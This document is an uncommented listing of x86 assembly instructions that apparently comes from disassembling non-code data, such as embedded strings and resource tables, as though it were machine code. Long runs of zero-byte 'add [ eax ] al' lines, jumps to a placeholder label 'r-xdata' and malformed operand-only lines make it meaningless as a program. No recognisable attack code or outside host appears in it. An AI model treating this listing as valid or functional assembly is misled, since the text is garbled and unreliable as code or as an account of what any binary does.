add [ eax ] al
add [ eax + 0x1 ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jl r-xdata
inc esp
insb
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
[ eax - 0x57ffbbf7 ]
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
and [ esi ] dl
inc edx
add [ eax ] ch
add [ gs : eax ] dl
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp - 0x4e ]
inc ebx
inc ebp
add [ edx + eax ] cl
add bh bh
add [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add dh bh
enter 0x4409 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x59b86564
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f460400
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
or al 0xc8
inc ebx
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
push esp
adc [ eax ] al
or [ edx ] al
add bh bh
dec esp
je r-xdata
jb r-xdata
add [ 0x6f6c6f43 ] al
inc ebx
add [ ebx ] dl
add al [ eax ]
jmp [ esp + esi * 2 ]
add bh bh
cwde
or [ eax + eax - 0x58 ] eax
jb r-xdata
add [ eax ] al
[ eax + eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
mov ecx 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax + 0xa ]
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0x34ff0001
jb r-xdata
add [ eax + 0x1 ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
mov ecx 0x72600043
inc esp
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
or eax 0xff0002
jne r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
0x18ff0000 0x440a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
mov ecx 0x8a40043
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
inc esp
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add al [ eax ]
dec [ eax + 0x1004375 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ esi ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pushad
jb r-xdata
outsb
jne r-xdata
ja r-xdata
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
les eax [ edi ]
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xb0656c62
js r-xdata
inc esp
add ah dl
or [ eax + eax + 0x1 ] al
add al ah
jb r-xdata
je r-xdata
jb r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
js r-xdata
imul esi [ eax ] 0xffffffc2
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
outsb
inc ebx
push 0x65676e61
mov al 0x78
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
push 0x6948776f
outsb
add [ eax ] cl
push ebx
inc ebx
push 0xf9bc7261
popad
jae r-xdata
push eax
popad
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070037 ] al
mov al 0x78
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x64 ] bp
mov ebp 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
jo r-xdata
fadd [ eax ]
jb r-xdata
outsb
dec edi
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94243ea
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
popad
outsb
mov al 0x78
js r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
loopne r-xdata
jo r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
mov ebx 0xd80043
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
bound eax [ eax ]
mov eax eax
ja r-xdata
dec edi
outsb
push ebx
je r-xdata
or [ ebx + 0xe00043 ] bh
add bh bh
add [ eax ] al
jmp eax
in al 0xbb
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
js r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
add [ eax ] al
add [ esi + eax * 8 + 0x34640043 ] bl
inc eax
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
mov ebx 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
mov al 0x78
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
mov esp 0xf00043
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
mov ebp 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
inc esp
outsd
ja r-xdata
inc ebx
add [ eax - 0x31 ] al
inc esp
add [ eax ] dh
clc
inc ebx
add al ah
jl r-xdata
add ah cl
add eax [ edx ]
or al bh
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0x43 ] dh
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x434654c0 ] cl
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
mov edi 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
cmp [ ebx + 0xd80043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x48
add [ eax - 0x8 ] dl
inc ebx
add [ eax - 0x31 ] dl
inc esp
add [ eax + 0x4400442d ] dh
stc
inc ebx
add [ ecx + edi * 8 - 0x78fffbd ] al
inc ebx
add [ edi + ecx * 8 + 0x44 ] ah
add [ eax - 0x31 ] ch
inc esp
add [ eax + edi * 8 - 0x9fbffbd ] dl
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
add [ eax - 0x9 ] ch
inc ebx
add [ esi + ecx * 8 + 0x2da80044 ] dh
inc esp
add al ah
clc
inc ebx
add [ edi + esi * 8 - 0x30fbffbd ] bl
inc esp
add [ eax ] bl
iretd
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ebx
add [ eax ] al
add al 0x42
add [ eax + edi * 8 + 0x3500043 ] dh
inc edx
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
add [ eax ] cl
clc
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
and al 0xcd
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x4346f8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
clc
inc esi
inc ebx
push esp
inc esi
inc ebx
add [ ecx * 8 + 0x10540043 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ edx - 0x3f74ffc0 ] bh
lea eax [ bx + si ]
in al 0x45
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
je r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x48be0043 ] ah
inc ebx
add [ edx + eax ] cl
add [ eax ] al
jo r-xdata
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x47d4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec eax
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
je r-xdata
add ah dh
test [ ebx ] 0xa8
jl r-xdata
add al 0x42
add [ eax + eax ] ch
add [ eax ] al
pushfd
mov [ ebx ] 0x64
xor al 0x40
inc ebx
add [ eax ] al
je r-xdata
outsb
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
inc esp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
inc esp
jge r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
add al dl
xor [ eax ] eax
cwde
add eax [ edx ]
test [ ebx + eax * 2 ] bh
int3
jb r-xdata
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x7ee00044 ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x7bffbdfd ] bl
jl r-xdata
inc eax
outsd
je r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
outsd
insb
aam 0x47
add ah ch
jge r-xdata
add ah dl
dec eax
add [ eax + 0x4e ] dh
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
inc edx
mov ah 0x31
insb
add [ 0x65646e49 ] al
js r-xdata
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
sbb [ edi + 0x43 ] bh
insb
jae r-xdata
inc ebx
add [ ecx * 8 + 0xb0043 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
push 0xb400437e
jle r-xdata
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
je r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 - 0x7fd3ffbc ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax - 0x80 ] ch
inc ebx
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ ebp + 0x49480040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x43 ] bl
add [ eax - 0x1fffbc83 ] bl
jge r-xdata
add ah cl
inc ebx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ebx ] sub_437f7c
mov al [ 0x700437f ]
push esp
inc edx
jne r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 ] bl
inc ebx
add [ esi + 0x4a ] cl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x53ffbcb9 ] cl
add al [ edx ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
dec edx
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax - 0x73ffbbd0 ] al
push es
pushad
sub [ eax + eax + 0x74 ] eax
std
inc ebx
add dh bh
enter 0x4409 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69420800
je r-xdata
mov eax eax
pop esp
dec edx
add ah ch
jge r-xdata
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esi + ebp * 2 + 0x44 ] ch
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec esp
mov ecx 0x8a40043
inc esp
add ah dl
or [ eax + eax - 0x60 ] al
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
add [ eax ] cl
inc edx
je r-xdata
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add [ edi + edi * 2 + 0x80043 ] ah
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add bh bh
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
dec eax
dec ecx
inc ebx
add al dl
dec eax
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
dec eax
call [ eax + eax * 4 - 0x7efbffbd ]
inc ebx
add [ eax - 0x7fffbc7f ] cl
add [ ebx ] 0x8
add [ ebx ] 0xdc
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ eax ] bl
jg r-xdata
inc eax
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
xor [ eax ] eax
shl [ ecx ] 0x1
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
outsd
insb
lea eax [ eax ]
aam 0x48
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
inc esp
add [ ecx ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ edx + 0x69 ] al
inc ebx
je r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
add [ eax ] dl
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x1
inc esp
mov dl 0x43
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
and [ esi ] dl
inc edx
add [ eax ] ch
popad
dec ebp
outsd
add [ gs : eax ] dl
mov dl 0x43
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
popad
add [ eax ] al
add ah dh
mov [ ecx ] es
cmp al 0x0
add dh bh
sbb ah bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
mov ecx 0x610043
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
push 0x5f004177
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
imul ebp [ esi + 0x74 ] r-xdata
pushad
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add bh bh
pop esp
or [ eax + eax + 0x1 ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
[ eax - 0x57ffbbf7 ]
jae r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
add bh bh
add al ah
jb r-xdata
les eax [ edi ]
jo r-xdata
adc [ eax ] al
0x18ff0000 0x440a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
add bh bh
cwde
or [ eax + eax - 0x58 ] eax
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
add al 0x7f
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov ecx 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
dec ebx
jns r-xdata
mov al 0x78
js r-xdata
jo r-xdata
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ebx 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
mov al 0x78
mov esp 0xf00043
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc esp
pop es
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x1 ] al
mov ecx 0x72600043
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
